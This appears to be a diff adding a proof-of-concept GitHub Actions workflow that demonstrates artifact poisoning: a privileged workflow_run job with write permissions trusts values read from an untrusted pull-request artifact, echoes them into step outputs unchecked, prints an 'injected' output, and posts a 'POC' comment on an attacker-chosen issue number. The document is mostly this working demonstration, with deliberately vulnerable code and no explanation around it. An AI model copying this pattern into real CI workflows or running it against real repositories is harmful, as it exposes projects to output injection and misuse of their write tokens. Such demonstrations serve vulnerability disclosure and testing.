@@ -1,0 +1,57 @@
+name: Comment Playground Link
+
+on:
+  workflow_run:
+    workflows: ['Build Live Branch']
+    types:
+      - completed
+
+jobs:
+  comment:
+    if: >
+      github.event.workflow_run.conclusion == 'success' &&
+      github.event.workflow_run.event == 'pull_request'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      actions: read
+    steps:
+      - name: Download PR metadata artifact
+        uses: actions/download-artifact@v8
+        with:
+          name: pr-metadata
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Read PR metadata
+        id: pr
+        run: |
+          echo "number=$(cat pr_number.txt)" >> "$GITHUB_OUTPUT"
+          echo "sha=$(cat commit_sha.txt)" >> "$GITHUB_OUTPUT"
+
+      - name: Show attacker-controlled outputs
+        env:
+          NUM: ${{ steps.pr.outputs.number }}
+          SHA: ${{ steps.pr.outputs.sha }}
+          INJ: ${{ steps.pr.outputs.injected }}
+        run: |
+          printf 'number=[%s]\n' "$NUM"
+          printf 'sha=[%s]\n' "$SHA"
+          printf 'injected=[%s]\n' "$INJ"
+
+      - name: Comment on PR with WordPress Playground link
+        uses: actions/github-script@v9
+        env:
+          PR_NUMBER: ${{ steps.pr.outputs.number }}
+        with:
+          script: |
+            const prNumber = Number(process.env.PR_NUMBER);
+            core.info('POC: privileged bot commenting on issue/PR #' + prNumber + ' chosen by the untrusted artifact');
+            const r = await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: prNumber,
+              body: 'POC: comment posted by the privileged workflow_run job on an attacker-chosen issue/PR number taken from the untrusted artifact.',
+            });
+            core.info('comment id ' + r.data.id);
